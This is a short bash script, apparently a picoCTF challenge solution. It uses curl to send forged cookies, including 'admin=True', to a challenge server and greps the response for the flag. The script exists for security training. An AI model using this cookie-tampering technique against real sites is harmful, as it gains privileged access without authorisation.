#!/bin/bash

curl 'http://jupiter.challenges.picoctf.org:13594/flag' -b 'username=Joe; password=password; admin=True' -L -i | grep -e "picoCTF{.*}"
